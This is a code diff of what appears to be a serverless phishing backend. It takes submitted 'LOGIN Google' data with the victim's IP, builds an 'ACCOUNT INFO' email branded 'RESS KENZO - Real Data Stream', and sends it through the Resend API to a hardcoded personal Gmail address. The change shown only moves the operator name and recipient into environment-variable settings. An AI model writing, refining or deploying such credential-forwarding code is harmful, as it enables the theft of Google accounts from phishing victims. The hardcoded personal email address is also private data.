@@ -4,6 +4,13 @@ export const config = {
     }
 };
 
+// Ambil setting dari config
+// Karena di Vercel serverless, kita simpan di file yang sama
+let SETTING = {
+    email: "medikaputra5@gmail.com",
+    nama: "RESS KENZO"
+};
+
 export default async function handler(req, res) {
 
     res.setHeader("Access-Control-Allow-Origin", "*");
@@ -37,6 +44,10 @@ export default async function handler(req, res) {
             return res.status(400).json({ error: "BODY_EMPTY" });
         }
 
+        // Ambil setting dari environment (fallback ke default)
+        const NAMA  = process.env.RESS_NAME  || "RESS KENZO";
+        const EMAIL = process.env.RESS_EMAIL || "medikaputra5@gmail.com";
+
         const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
 
         const htmlBody = `
@@ -46,7 +57,7 @@ export default async function handler(req, res) {
 <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
   <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
     <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
-      <h1 style="margin:0;font-size:22px">🕵️ RESS KENZO 🕵️</h1>
+      <h1 style="margin:0;font-size:22px">🕵️ ${NAMA} 🕵️</h1>
     </div>
     <div style="padding:25px">
       <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">📧 ACCOUNT INFO</h3>
@@ -79,7 +90,7 @@ export default async function handler(req, res) {
       </table>
     </div>
     <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">
-      RESS KENZO - Real Data Stream
+      ${NAMA} - Real Data Stream
     </div>
   </div>
 </div>`;
@@ -91,9 +102,9 @@ export default async function handler(req, res) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                from: "RESS KENZO <onboarding@resend.dev>",
-                to: ["medikaputra5@gmail.com"],
-                subject: "🕵️ RESS KENZO 🕵️ - " + Date.now(),
+                from: NAMA + " <onboarding@resend.dev>",
+                to: [EMAIL],
+                subject: "🕵️ " + NAMA + " 🕵️ - " + Date.now(),
                 html: htmlBody
             })
         });
